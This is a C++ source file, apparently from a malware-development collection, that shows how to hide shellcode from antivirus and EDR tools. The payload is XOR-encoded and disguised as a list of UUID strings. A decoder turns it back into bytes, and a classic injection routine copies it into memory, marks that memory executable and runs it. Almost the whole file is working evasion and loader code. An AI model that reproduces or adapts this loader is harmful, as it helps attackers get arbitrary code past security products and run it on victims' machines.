/*
* Title: Shellcode Obfuscation: UUID
* Resources:
*	- https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354
*/
#include <Windows.h>
#include <vector>
#include <string>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <algorithm>

#define XOR_KEY 0x21

std::vector<uint8_t> DecodeUUIDs(const std::vector<std::string>& uuids) {
    std::vector<uint8_t> shellcode;

    for (const auto& uuid : uuids) {
        std::string uuidStr(uuid.data());
        // Remove '-' from UUID string
        uuidStr.erase(std::remove(uuidStr.begin(), uuidStr.end(), '-'), uuidStr.end());

        for (int i = 0; i < uuidStr.length(); i += 2) {
            std::string byteStr = uuidStr.substr(i, 2);
            // Convert to hex
            uint8_t byte = static_cast<uint8_t>(std::stoi(byteStr, nullptr, 16));
            uint8_t byteXOR = byte ^ XOR_KEY;

            shellcode.push_back(byteXOR);
        }
    }

    return shellcode;
}


int main() {
    // Generated by UUID.py
    std::vector<std::string> shellcodeUUIDs = {
        "dd69a2c5-d1c9-e121-2121-607060717370",
        "776910f3-4469-aa73-4169-aa733969aa73",
        "0169aa53-7169-2e96-6b6b-6c10e86910e1",
        "8d1d405d-230d-0160-e0e8-2c6020e0c3cc",
        "73607069-aa73-01aa-631d-6920f1aaa1a9",
        "21212169-a4e1-5546-6920-f171aa693965",
        "aa610168-20f1-c277-69de-e860aa15a969",
        "20f76c10-e869-10e1-8d60-e0e82c6020e0",
        "19c154d0-6d22-6d05-2964-18f054f97965",
        "aa610568-20f1-4760-aa2d-6965aa613d68",
        "20f160aa-25a9-6920-f160-7960797f787b",
        "60796078-607b-69a2-cd01-6073dec17960",
        "787b69aa-33c8-76de-dede-7c699b202121",
        "21212121-2169-acac-2020-2121609b10aa",
        "4ea6def4-9ad1-9483-7760-9b87b49cbcde",
        "f469a2e5-091d-275d-2ba1-dac154249a66",
        "32534e4b-2178-60a8-fbde-f442404d420f",
        "44594421-b1b1-b1b1-b1b1-b1b1b1b1b1b1"
    };

    std::vector<uint8_t> shellcode = DecodeUUIDs(shellcodeUUIDs);

    // ------------------------------------------------------------------------------------------- //
    // The following code is an example for classic shellcode injection.
    // ------------------------------------------------------------------------------------------- //

    LPVOID lpExec = VirtualAlloc(0, shellcode.size(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpExec) return FALSE;

    memcpy(lpExec, shellcode.data(), shellcode.size());

    DWORD dwOldProtect = 0;
    if (!VirtualProtect(lpExec, shellcode.size(), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        VirtualFree(lpExec, 0, MEM_RELEASE);
        return FALSE;
    }

    ((void(*)())lpExec)();

	return 0;
}